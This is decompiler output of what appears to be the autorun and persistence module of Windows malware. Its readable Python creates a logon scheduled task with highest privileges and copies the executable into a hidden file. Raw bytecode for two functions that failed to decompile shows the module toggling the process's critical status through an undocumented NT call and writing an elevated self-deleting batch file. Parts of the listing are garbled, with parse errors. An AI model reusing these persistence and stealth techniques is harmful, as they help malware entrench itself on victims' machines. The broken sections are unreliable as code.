# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: Core\Main\Autorun.py
import os, shutil, ctypes, subprocess

def AddToAutorun(AutorunName, InstallPath, ProcessName):
    subprocess.call(('schtasks /create /f /sc onlogon /rl highest /tn "' + AutorunName + '" /tr "' + InstallPath + ProcessName + '"'), shell=True)


def CopyToAutorun(CurrentPath, InstallPath, ProcessName):
    shutil.copy2(CurrentPath, '' + InstallPath + ProcessName)
    ctypes.windll.kernel32.SetFileAttributesW(InstallPath + ProcessName, 2)


schtasks = '@chcp 65001 && @schtasks.exe'

def SchtasksExists--- This code section failed: ---

 L.  26         0  SETUP_FINALLY        50  'to 50'

 L.  27         2  LOAD_GLOBAL              subprocess
                4  LOAD_ATTR                check_output
                6  LOAD_GLOBAL              schtasks
                8  FORMAT_VALUE          0  ''
               10  LOAD_STR                 ' /query /tn "'
               12  LOAD_FAST                'AutorunName'
               14  FORMAT_VALUE          0  ''
               16  LOAD_STR                 '"'
               18  BUILD_STRING_4        4 

 L.  28        20  LOAD_CONST               True
               22  LOAD_GLOBAL              subprocess
               24  LOAD_ATTR                DEVNULL
               26  LOAD_GLOBAL              subprocess
               28  LOAD_ATTR                DEVNULL

 L.  27        30  LOAD_CONST               ('shell', 'stderr', 'stdin')
               32  CALL_FUNCTION_KW_4     4  '4 total positional and keyword args'
               34  LOAD_ATTR                decode

 L.  28        36  LOAD_STR                 'utf-8'
               38  LOAD_STR                 'strict'

 L.  27        40  LOAD_CONST               ('encoding', 'errors')
               42  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               44  STORE_FAST               'Process'
               46  POP_BLOCK        
               48  JUMP_FORWARD         72  'to 72'
             50_0  COME_FROM_FINALLY     0  '0'

 L.  29        50  DUP_TOP          
               52  LOAD_GLOBAL              subprocess
               54  LOAD_ATTR                CalledProcessError
               56  <121>                70  ''
               58  POP_TOP          
               60  POP_TOP          
               62  POP_TOP          

 L.  30        64  POP_EXCEPT       
               66  LOAD_CONST               False
               68  RETURN_VALUE     
               70  <48>             
             72_0  COME_FROM            48  '48'

 L.  32        72  LOAD_STR                 'ERROR:'
               74  LOAD_FAST                'Process'
               76  <118>                 1  ''
               78  RETURN_VALUE     

Parse error at or near `<121>' instruction at offset 56


def InstallPathExists(InstallPath, ProcessName):
    if os.path.exists(InstallPath + ProcessName):
        return True


def Uninstall--- This code section failed: ---

 L.  45         0  LOAD_GLOBAL              ctypes
                2  LOAD_ATTR                windll
                4  LOAD_ATTR                ntdll
                6  LOAD_METHOD              RtlSetProcessIsCritical
                8  LOAD_CONST               0
               10  LOAD_CONST               0
               12  LOAD_CONST               0
               14  CALL_METHOD_3         3  ''
               16  LOAD_CONST               0
               18  COMPARE_OP               ==
               20  POP_TOP          

 L.  46        22  LOAD_GLOBAL              ctypes
               24  LOAD_ATTR                windll
               26  LOAD_ATTR                kernel32
               28  LOAD_METHOD              SetFileAttributesW
               30  LOAD_FAST                'CurrentPath'
               32  LOAD_CONST               0
               34  CALL_METHOD_2         2  ''
               36  POP_TOP          

 L.  47        38  LOAD_GLOBAL              ctypes
               40  LOAD_ATTR                windll
               42  LOAD_ATTR                kernel32
               44  LOAD_METHOD              SetFileAttributesW
               46  LOAD_FAST                'InstallPath'
               48  LOAD_FAST                'ProcessName'
               50  BINARY_ADD       
               52  LOAD_CONST               0
               54  CALL_METHOD_2         2  ''
               56  POP_TOP          

 L.  49        58  LOAD_GLOBAL              open
               60  LOAD_GLOBAL              os
               62  LOAD_ATTR                path
               64  LOAD_METHOD              join
               66  LOAD_FAST                'Directory'
               68  LOAD_STR                 'Uninstaller.bat'
               70  CALL_METHOD_2         2  ''
               72  LOAD_STR                 'w'
               74  CALL_FUNCTION_2       2  ''
               76  SETUP_WITH          158  'to 158'
               78  STORE_FAST               'OPATH'

 L.  50        80  LOAD_FAST                'OPATH'
               82  LOAD_METHOD              writelines
               84  LOAD_STR                 'taskkill /f /im "'
               86  LOAD_FAST                'CurrentName'
               88  BINARY_ADD       
               90  LOAD_STR                 '"\n'
               92  BINARY_ADD       

 L.  51        94  LOAD_STR                 'schtasks /delete /f /tn "'
               96  LOAD_FAST                'AutorunName'
               98  BINARY_ADD       
              100  LOAD_STR                 '"\n'
              102  BINARY_ADD       

 L.  52       104  LOAD_STR                 'del /s /q /f "'
              106  LOAD_FAST                'CurrentPath'
              108  BINARY_ADD       
              110  LOAD_STR                 '"\n'
              112  BINARY_ADD       

 L.  53       114  LOAD_STR                 'del /s /q /f "'
              116  LOAD_FAST                'InstallPath'
              118  BINARY_ADD       
              120  LOAD_FAST                'ProcessName'
              122  BINARY_ADD       
              124  LOAD_STR                 '"\n'
              126  BINARY_ADD       

 L.  54       128  LOAD_STR                 'rmdir /s /q "'
              130  LOAD_FAST                'Directory'
              132  BINARY_ADD       
              134  LOAD_STR                 '"'
              136  BINARY_ADD       

 L.  50       138  BUILD_LIST_5          5 
              140  CALL_METHOD_1         1  ''
              142  POP_TOP          
              144  POP_BLOCK        
              146  LOAD_CONST               None
              148  DUP_TOP          
              150  DUP_TOP          
              152  CALL_FUNCTION_3       3  ''
              154  POP_TOP          
              156  JUMP_FORWARD        174  'to 174'
            158_0  COME_FROM_WITH       76  '76'
              158  <49>             
              160  POP_JUMP_IF_TRUE    164  'to 164'
              162  <48>             
            164_0  COME_FROM           160  '160'
              164  POP_TOP          
              166  POP_TOP          
              168  POP_TOP          
              170  POP_EXCEPT       
              172  POP_TOP          
            174_0  COME_FROM           156  '156'

 L.  57       174  SETUP_FINALLY       196  'to 196'

 L.  58       176  LOAD_GLOBAL              os
              178  LOAD_METHOD              startfile
              180  LOAD_FAST                'Directory'
              182  LOAD_STR                 'Uninstaller.bat'
              184  BINARY_ADD       
              186  LOAD_STR                 'runas'
              188  CALL_METHOD_2         2  ''
              190  POP_TOP          
              192  POP_BLOCK        
              194  BREAK_LOOP          212  'to 212'
            196_0  COME_FROM_FINALLY   174  '174'

 L.  59       196  POP_TOP          
              198  POP_TOP          
              200  POP_TOP          

 L.  60       202  POP_EXCEPT       
              204  JUMP_BACK           174  'to 174'
              206  <48>             

 L.  62       208  BREAK_LOOP          212  'to 212'
              210  JUMP_BACK           174  'to 174'

Parse error at or near `DUP_TOP' instruction at offset 148